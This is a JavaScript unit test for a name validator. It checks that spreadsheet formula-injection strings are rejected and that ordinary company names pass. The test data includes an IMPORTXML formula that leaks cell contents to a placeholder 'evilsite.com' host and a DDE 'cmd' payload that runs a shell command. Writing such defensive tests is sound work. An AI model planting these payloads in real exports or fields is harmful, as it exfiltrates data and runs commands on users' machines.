import nameValidator from '../client/nameValidator'

describe('names with possible csv injections', () => {
  const csvStrings = [
    '=IMPORTXML(CONCAT(""http://evilsite.com?leak="", CONCATENATE(A2:B2)), ""//a"")',
    '@COMPANY_NAME',
    ', =cmd|`/C ping -t 172.0.0.1 -l 25152`!`A1',
    '+A1',
    '-A1',
    '	name',
    'name, =cmd',
    'name, @COMPANY_NAME',
    'name,   +=IMPORTXML',
    'name, ,  -IMPORTXML',
  ]

  csvStrings.forEach((element) => {
    it(`returns invalid name for string ${element}`, () => {
      expect(nameValidator(element)).to.equal('Enter a valid name')
    })
  })
})

describe('innocent possible names', () => {
  const companyNames = ['A=M', 'My Company@', 'My,Company', '4MY', 'good+evil']

  companyNames.forEach((name) => {
    it(`returns null for ${name}`, () => {
      expect(nameValidator(name)).to.be.null
    })
  })
})
